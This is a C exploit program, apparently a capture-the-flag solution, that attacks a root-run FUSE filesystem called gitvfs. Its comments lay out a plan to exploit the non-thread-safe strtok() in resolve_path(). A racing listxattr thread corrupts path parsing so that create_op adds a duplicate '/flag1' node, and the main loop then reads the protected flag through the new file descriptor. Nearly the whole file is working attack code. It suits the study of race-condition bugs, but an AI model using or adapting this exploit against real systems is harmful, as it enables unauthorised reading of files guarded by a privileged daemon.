
#include "pthread.h"
#include "stdio.h"
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <unistd.h>

// gitvfs is daemon running as root
// fuse_main_real arg: "allow_other,default_permissions,max_threads=2"

// **vuln**:
// resolve_path() uses strtok(), which has process-global tokenizer state.
// The FUSE mount is created with max_threads=2, so two callbacks can
// corrupt each other's component stream.

// files in a directory are sorted lexicographically by the stored basename
// component

// exploit plan:
// - abuse strtok not being thread safe to have create_op create a new vfs node
// for already existing "/flag1" path
//      - based on alloc_helper using resolve_path to check if path exists
// - vfs node is inserted **after** the original flag1 vfs node
// - metadata of returned fd will have read permissions for ctf user
// - when reading file, kernel allows read based on fd, but FUSE code **resolves
// to original flag1 node** since its node appears first in the directory linked
// list

#define WAIT(void)                                                             \
    {                                                                          \
        getc(stdin);                                                           \
        fflush(stdin);                                                         \
    }
#define errExit(fmt, ...)                                                      \
    do {                                                                       \
        int saved_errno = errno;                                               \
        fprintf(stderr, fmt ": %s\n", ##__VA_ARGS__, strerror(saved_errno));   \
        exit(EXIT_FAILURE);                                                    \
    } while (0)

void info(const char *format, ...) {
    va_list args;
    va_start(args, format);

    printf("[+] ");
    vprintf(format, args);

    va_end(args);
}
static bool g_stop;
char *g_poison_path = "/mnt/gitvfs/spray/z";

void create_race_layout(void) {
    int ret = mkdir("spray", 0755);
    if (ret < 0) {
        errExit("failed to create spray dir \n");
    }

    char path[0x100] = {0};

    // all of these files starting with 'a' are lexicographically before "flag1"
    // and "spray"
    for (unsigned i = 0; i < 0x300; ++i) {
        snprintf(path, sizeof(path), "/mnt/gitvfs/a%x", i);

        int fd = open(path, O_CREAT | O_RDWR);
        if (fd < 0) {
            errExit("failed to create: %s \n", path);
        }

        write(fd, "a", 1);
    }
    int fd = open(g_poison_path, O_CREAT | O_RDWR);
    if (fd < 0) {
        errExit("failed to create poison path \n");
    }
}

void *poisoner(void *arg) {
    info("poisoner enter \n");
    char xbuf[4096];
    while (!g_stop) {

        /*
         * listxattr() on an existing regular file reaches listxattr_op(),
         * which calls resolve_path("/mnt/gitvfs/spray/z) even when the file has
         * no history.
         */
        (void)listxattr(g_poison_path, xbuf, sizeof(xbuf));
    }

    return NULL;
}

int main(void) {
    info("enter\n");
    create_race_layout();
    info("setup directory layout \n");

    pthread_t t_p;
    pthread_create(&t_p, NULL, poisoner, NULL);

    info("starting race \n");
    char flag[0x100] = {0};
    for (unsigned i = 0; i < 0x4000; ++i) {
        // successfully created a second node with basename "flag1"
        int fd = open("/mnt/gitvfs/flag1", O_CREAT | O_RDONLY | O_EXCL);
        if (fd >= 0) {
            // kernel allows read for our created file, FUSE layer resolved to
            // the original flag1 though
            int cnt = read(fd, flag, sizeof(flag));
            if (cnt > 5) {
                printf("flag: %s \n", flag);
                break;
            }
        }
    }

    g_stop = true;
    pthread_join(t_p, NULL);
    info("done \n");
}
